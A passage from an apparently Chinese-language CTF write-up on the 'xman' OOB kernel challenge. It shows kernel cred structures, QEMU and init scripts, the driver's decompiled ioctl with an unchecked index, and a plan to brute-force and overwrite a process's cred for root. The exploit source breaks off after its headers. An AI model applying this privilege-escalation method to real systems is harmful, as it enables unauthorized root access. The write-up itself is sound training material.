class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">long</span> state;	<span class="comment">/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span></span><br><span class="line">	<span class="keyword">void</span> *<span class="built_in">stack</span>;</span><br><span class="line">	<span class="keyword">atomic_t</span> usage;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;	<span class="comment">/* per process flags, defined below */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ptrace;</span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line"><span class="comment">/* process credentials */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">ptracer_cred</span>;</span> <span class="comment">/* Tracer's credentials at attach */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">real_cred</span>;</span> <span class="comment">/* objective and real subjective task</span></span><br><span class="line"><span class="comment">					 * credentials (COW) */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">cred</span>;</span>	<span class="comment">/* effective (overridable) subjective task</span></span><br><span class="line"><span class="comment">					 * credentials (COW) */</span></span><br><span class="line">	<span class="keyword">char</span> comm[TASK_COMM_LEN]; <span class="comment">/* executable name excluding path</span></span><br><span class="line"><span class="comment">				     - access with [gs]et_task_comm (which lock</span></span><br><span class="line"><span class="comment">				       it with task_lock())</span></span><br><span class="line"><span class="comment">				     - initialized normally by setup_new_exec */</span></span><br><span class="line"><span class="comment">/* file system info */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nameidata</span> *<span class="title">nameidata</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSVIPC</span></span><br><span class="line"><span class="comment">/* ipc stuff */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sysv_sem</span> <span class="title">sysvsem</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sysv_shm</span> <span class="title">sysvshm</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">... ... </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we're permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="xman结营赛-OOB"><a href="#xman结营赛-OOB" class="headerlink" title="xman结营赛 OOB"></a>xman结营赛 OOB</h3><h4 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h4><p>这个题坑还挺多的(还是我太菜了)，启动脚本去掉定时关机，去掉aslr方便调试。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#echo "[+]starting qemu-"</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -append <span class="string">'console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr'</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -smp cores=2,threads=4 \</span><br><span class="line">    -cpu qemu64,smep,smap 2&gt;/dev/null \</span><br><span class="line">    -s</span><br><span class="line"><span class="comment">#echo "[-]boot end"</span></span><br></pre></td></tr></table></figure>
<p>新建一个文件夹把cpio拷进去，执行<code>cpio -dmv &lt; rootfs.cpio</code>解压出文件系统，到./etc/init.d里去改rcS(这里的init脚本为空)，初始脚本里没有挂载<code>/sys</code>目录导致我们没法看更多信息(lsmod可以查看模块.text的加载基址)，可以先拿root起，方便看函数地址等。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount /dev/pts</span><br><span class="line"></span><br><span class="line">insmod /home/pwn/OOB.ko</span><br><span class="line">chmod 644 /dev/OOB</span><br><span class="line">chmod -R 777 /sys/</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /home/pwn</span><br><span class="line">chown -R root /flag</span><br><span class="line">chmod 400 /flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chown -R 1000:1000 .</span><br><span class="line"><span class="comment">#chown -R 0:0 .</span></span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line"><span class="comment">#poweroff -f</span></span><br></pre></td></tr></table></figure>
<p>另外进去之后看一眼/dev/OOB的权限会发现普通用户是只读的，我平时<code>open</code>的时候参数习惯为<code>2</code>表示可读写，现在普通用户只能为<code>0</code>，否则文件打开会失败。</p>
<p>OOB.ko里其实只有一个<code>ioctl</code>，里面有四个命令，分别对应<code>Malloc</code>、<code>Free</code>、<code>Write</code>和<code>Read</code>，仔细观察一下我们可以控制<code>idx</code>、<code>user_buf</code>、<code>stack_size</code>和<code>stack_idx</code>而在R/W的时候没有对<code>idx</code>进行检查，虽然他是一个unsigned int的类型，但是我们可以往前任意读，我们Malloc的对象是一个0x100大小的对象，其地址作为obj的addr和0x100存储在bss上，如果bss_list高地址有一些数据满足条件我们就可以任意读了(<code>stack_idx + stack_size &lt;= obj_idx1-&gt;size</code>)这里的stack_idx可以看成addr的offset(单字节)，stack_size为我们想读取的数据大小，其相加小于<code>size</code>，因为我们不能事先在bss上写东西，因此只能往前找满足条件的fake_obj。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">00000000 object          struc ; (sizeof=0x10, align=0x8, copyof_484)</span></span><br><span class="line"><span class="comment">00000000                                         ; XREF: .bss:pool/r</span></span><br><span class="line"><span class="comment">00000000 addr            dq ?                    ; XREF: oob_ioctl+5F/r</span></span><br><span class="line"><span class="comment">00000000                                         ; oob_ioctl+110/r ... ; offset</span></span><br><span class="line"><span class="comment">00000008 size            dq ?</span></span><br><span class="line"><span class="comment">00000010 object          ends</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">oob_ioctl</span><span class="params">(__int64 arg1, <span class="keyword">unsigned</span> <span class="keyword">int</span> arg2, __int64 arg3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> arg22; <span class="comment">// ebx</span></span><br><span class="line">  __int64 arg33; <span class="comment">// rsi</span></span><br><span class="line">  __int64 idx1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *obj_idx1_addr; <span class="comment">// rsi</span></span><br><span class="line">  object *obj_idx1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// r13</span></span><br><span class="line">  object *obj_idx; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">bool</span> obj_addr; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">void</span> *alloc_addr; <span class="comment">// rax</span></span><br><span class="line">  __int64 v13; <span class="comment">// r12</span></span><br><span class="line">  __int64 idx2; <span class="comment">// rax</span></span><br><span class="line">  __int64 addr_idx2; <span class="comment">// rdi</span></span><br><span class="line">  object *v16; <span class="comment">// rax</span></span><br><span class="line">  __int64 idx3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *v18; <span class="comment">// rdi</span></span><br><span class="line">  object *v19; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line">  __int64 user_buf; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line">  __int64 stack_size; <span class="comment">// [rsp+10h] [rbp-28h]</span></span><br><span class="line">  __int64 stack_idx; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  arg22 = arg2;</span><br><span class="line">  arg33 = arg3;</span><br><span class="line">  copy_from_user(&amp;idx, arg3, <span class="number">0x20</span>LL);           <span class="comment">// idx可控</span></span><br><span class="line">  <span class="keyword">if</span> ( arg22 != <span class="number">0x30001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( arg22 &lt;= <span class="number">0x30001</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( arg22 == <span class="number">0x30000</span> )                   <span class="comment">// 0x30000-&gt;malloc</span></span><br><span class="line">      &#123;</span><br><span class="line">        v9 = user_buf;</span><br><span class="line">        JUMPOUT(*(&amp;obj_num + <span class="number">0x40000000</span>), <span class="number">9</span>, oob_ioctl_cold_0);<span class="comment">// obj_num大于9跳转</span></span><br><span class="line">        obj_idx = &amp;pool[idx];                   <span class="comment">// no check </span></span><br><span class="line">        obj_addr = obj_idx-&gt;addr == <span class="number">0L</span>L;</span><br><span class="line">        obj_idx-&gt;size = <span class="number">0x100</span>LL;</span><br><span class="line">        <span class="keyword">if</span> ( obj_addr )</span><br><span class="line">        &#123;</span><br><span class="line">          alloc_addr = (<span class="keyword">void</span> *)kmem_cache_alloc(kmalloc_caches[<span class="number">8</span>], <span class="number">0x6000C0</span>LL);<span class="comment">// malloc 0x100</span></span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)alloc_addr &gt; <span class="number">0xF</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            obj_idx-&gt;addr = alloc_addr;</span><br><span class="line">            v13 = <span class="number">0L</span>L;</span><br><span class="line">            copy_from_user(alloc_addr, v9, <span class="number">0x100</span>LL);<span class="comment">// copy stack addr to heap</span></span><br><span class="line">            <span class="keyword">return</span> v13;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( arg22 != <span class="number">0x30002</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( arg22 == <span class="number">0x30003</span> )                 <span class="comment">// 0x30003</span></span><br><span class="line">        &#123;</span><br><span class="line">          idx1 = idx;</span><br><span class="line">          obj_idx1_addr = (<span class="keyword">char</span> *)pool[idx1].addr;</span><br><span class="line">          obj_idx1 = &amp;pool[idx1];               <span class="comment">// idx1无检查</span></span><br><span class="line">          <span class="keyword">if</span> ( obj_idx1_addr )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( stack_idx + stack_size &lt;= obj_idx1-&gt;size )</span><br><span class="line">            &#123;</span><br><span class="line">              copy_to_user(user_buf, &amp;obj_idx1_addr[stack_idx], stack_size);<span class="comment">// arbRead</span></span><br><span class="line">              <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">      idx2 = idx;                               <span class="comment">// 0x30002</span></span><br><span class="line">      addr_idx2 = (__int64)pool[idx2].addr;</span><br><span class="line">      v16 = &amp;pool[idx2];</span><br><span class="line">      <span class="keyword">if</span> ( addr_idx2 &amp;&amp; stack_idx + stack_size &lt;= v16-&gt;size )</span><br><span class="line">      &#123;</span><br><span class="line">        copy_from_user(stack_idx + addr_idx2, user_buf, stack_size);<span class="comment">// arbWrite</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  idx3 = idx;                                   <span class="comment">// 0x30001-&gt;free</span></span><br><span class="line">  v18 = pool[idx3].addr;</span><br><span class="line">  v19 = &amp;pool[idx3];</span><br><span class="line">  <span class="keyword">if</span> ( !v18 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  kfree(v18, arg33);</span><br><span class="line">  v19-&gt;addr = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一番努力之后终于找到了满足条件的地方，bss_list地址为<code>0xffffffffa0002420</code>，用这个obj我们可以读取<code>[0x000d00620000002e,0x000d00620000002e+0xffffffffa0002420)</code>范围内的地址的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffa0003090:     0x000d00620000002e     0xffffffffa0002420</span><br><span class="line">0xffffffffa00030a0:     0x0000000000000500      0x000b006400000033</span><br></pre></td></tr></table></figure>
<p>显然<code>bss_list</code>是满足这个条件的</p>
<p><img src="/2020/09/03/kernel/1.png" alt="alloc"></p>
<p>尝试多次分配，发现分配12次之后之前的slub缓存就用完了，会用Buddy分配新的一块区域供继续分配，至此我们的思路就有了，分配完这些内存然后<code>fork</code>一个进程，触发创建新的<code>cred</code>对象，这个对象地址一定在<code>0x*17df00</code>和<code>0x*1e3f100</code>之间，我们就可以爆破这块内存区域，寻找我们prctl设置的进程名，进而搜到cred。</p>
<p>下一步用任意地址读读取cred里前0x100的内容，修改前0x28字节为usr_buf。再用任意地址写写到free后的slab的fd，两次Malloc可以得到cred对象，把usr_buf拷贝进去后即可提权成功。</p>
<p><img src="/2020/09/03/kernel/2.png" alt="root"></p>
<h4 id="exp-c-4"><a href="#exp-c-4" class="headerlink" title="exp.c"></a>exp.c</h4><p>这里还有地方是我没想明白的，就是我以为自己修改的cred是子进程里的，没想到就是本进程的，之前一直在子进程起shell，卡了很久</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MallocCmd  0x30000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FreeCmd    0x30001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WriteCmd   0x30002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> 